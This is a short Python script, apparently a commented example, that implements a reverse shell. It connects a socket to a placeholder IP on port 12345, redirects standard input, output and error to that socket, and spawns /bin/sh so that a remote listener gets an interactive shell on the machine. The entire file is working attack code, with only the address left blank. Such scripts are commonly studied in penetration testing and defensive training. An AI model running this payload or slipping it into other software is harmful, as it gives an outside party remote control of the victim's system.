import socket  # Importing the socket module for network communication
import os      # Importing the os module for operating system related functions
import pty     # Importing the pty module for pseudo-terminal handling

# Creating a socket object
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connecting to the specified IP address and port
s.connect(("?.?.?.?", 12345))

# Redirecting standard input, output, and error to the socket connection
os.dup2(s.fileno(), 0)  # Duplicate socket file descriptor onto stdin
os.dup2(s.fileno(), 1)  # Duplicate socket file descriptor onto stdout
os.dup2(s.fileno(), 2)  # Duplicate socket file descriptor onto stderr

# Spawning a shell using pseudo-terminal emulation
pty.spawn("/bin/sh")